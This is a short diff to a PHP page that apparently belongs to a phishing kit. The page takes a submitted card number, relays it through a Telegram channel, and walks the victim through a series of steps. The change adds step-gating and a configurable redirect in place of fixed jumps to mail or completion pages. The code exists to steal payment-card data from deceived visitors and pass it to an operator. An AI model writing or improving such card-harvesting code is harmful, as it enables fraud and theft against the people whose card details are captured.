@@ -2,6 +2,11 @@
 include '../settings.php';
 include 'functions.php';
 
+if (!h4z3_is_step_active('card')) {
+    header('Location: ' . h4z3_get_first_step_path('../'));
+    exit;
+}
+
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
     $ccn = $_POST['card'];
@@ -50,14 +55,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             h4z3_mark_channel_failure('telegram_failed');
         }
         }
-        if($mailpage == "on"){
-          header('Location: ../mail.php');
-          exit;
-        }
-        else{
-          header('Location: ../complete.php');
-          exit;
-        }
+        $nextStep = h4z3_get_next_step_path('card', '../');
+        header('Location: ' . $nextStep);
+        exit;
 
 }
 ?>
